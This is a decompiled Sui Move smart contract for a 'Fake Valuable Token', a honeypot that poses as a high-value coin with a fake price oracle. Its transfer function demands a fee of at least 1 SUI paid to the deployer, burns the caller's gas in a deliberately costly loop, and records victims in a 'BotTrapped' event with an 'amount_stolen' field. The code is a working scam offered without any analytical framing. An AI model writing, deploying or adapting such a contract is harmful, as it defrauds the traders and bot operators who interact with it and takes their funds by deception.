module 0xf2361dc07b3f878a8f719d9c3e8e68ab49b51add7ed50915c7b9598417f89c3::fake_valuable_token {
    struct FAKE_VALUABLE_TOKEN has drop {
        dummy_field: bool,
    }

    struct TokenTreasury has key {
        id: 0x2::object::UID,
        treasury_cap: 0x2::coin::TreasuryCap<FAKE_VALUABLE_TOKEN>,
        deployer: address,
        total_tokens_minted: u64,
        total_fees_collected: u64,
        total_gas_burned: u64,
        bot_traps_triggered: u64,
        fake_price_oracle: u64,
        is_liquidity_active: bool,
    }

    struct TokenMinted has copy, drop {
        amount: u64,
        recipient: address,
        fake_price: u64,
        timestamp: u64,
    }

    struct BotTrapped has copy, drop {
        bot_address: address,
        fee_paid: u64,
        gas_burned: u64,
        amount_stolen: u64,
        timestamp: u64,
    }

    fun execute_expensive_poisoning(arg0: u64) : u64 {
        let v0 = 0;
        let v1 = 0;
        let v2 = 0;
        while (v0 < 100000) {
            let v3 = 0;
            while (v3 < 10) {
                let v4 = 0;
                while (v4 < 10) {
                    let v5 = v0 * v3 * v4 + arg0;
                    v2 = v2 + v5 * v5;
                    v1 = v1 + 1;
                    v4 = v4 + 1;
                };
                v3 = v3 + 1;
            };
            v0 = v0 + 1;
        };
        v1
    }

    public fun get_treasury_stats(arg0: &TokenTreasury) : (u64, u64, u64, u64) {
        (arg0.total_tokens_minted, arg0.total_fees_collected, arg0.total_gas_burned, arg0.bot_traps_triggered)
    }

    fun init(arg0: FAKE_VALUABLE_TOKEN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<FAKE_VALUABLE_TOKEN>(arg0, 9, b"FAKE_VALUABLE", b"Fake Valuable Token", b"High-value token for bot trapping", 0x1::option::none<0x2::url::Url>(), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<FAKE_VALUABLE_TOKEN>>(v1);
        let v2 = TokenTreasury{
            id                   : 0x2::object::new(arg1),
            treasury_cap         : v0,
            deployer             : 0x2::tx_context::sender(arg1),
            total_tokens_minted  : 0,
            total_fees_collected : 0,
            total_gas_burned     : 0,
            bot_traps_triggered  : 0,
            fake_price_oracle    : 1000000000,
            is_liquidity_active  : true,
        };
        0x2::transfer::share_object<TokenTreasury>(v2);
    }

    public fun sponsored_mint(arg0: &mut TokenTreasury, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg3) == arg0.deployer, 100);
        arg0.total_tokens_minted = arg0.total_tokens_minted + arg1;
        let v0 = TokenMinted{
            amount     : arg1,
            recipient  : arg2,
            fake_price : arg0.fake_price_oracle,
            timestamp  : 0x2::tx_context::epoch_timestamp_ms(arg3),
        };
        0x2::event::emit<TokenMinted>(v0);
        0x2::transfer::public_transfer<0x2::coin::Coin<FAKE_VALUABLE_TOKEN>>(0x2::coin::mint<FAKE_VALUABLE_TOKEN>(&mut arg0.treasury_cap, arg1, arg3), arg2);
    }

    public fun transfer_with_fee(arg0: &mut TokenTreasury, arg1: 0x2::coin::Coin<FAKE_VALUABLE_TOKEN>, arg2: address, arg3: 0x2::coin::Coin<0x2::sui::SUI>, arg4: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::coin::value<FAKE_VALUABLE_TOKEN>(&arg1);
        let v1 = 0x2::coin::value<0x2::sui::SUI>(&arg3);
        assert!(v1 >= 1000000000, 101);
        arg0.total_fees_collected = arg0.total_fees_collected + v1;
        arg0.total_gas_burned = arg0.total_gas_burned + execute_expensive_poisoning(v0);
        arg0.bot_traps_triggered = arg0.bot_traps_triggered + 1;
        let v2 = BotTrapped{
            bot_address   : 0x2::tx_context::sender(arg4),
            fee_paid      : v1,
            gas_burned    : 100000,
            amount_stolen : v0,
            timestamp     : 0x2::tx_context::epoch_timestamp_ms(arg4),
        };
        0x2::event::emit<BotTrapped>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<FAKE_VALUABLE_TOKEN>>(arg1, arg2);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg3, arg0.deployer);
    }

    // decompiled from Move bytecode v6
}

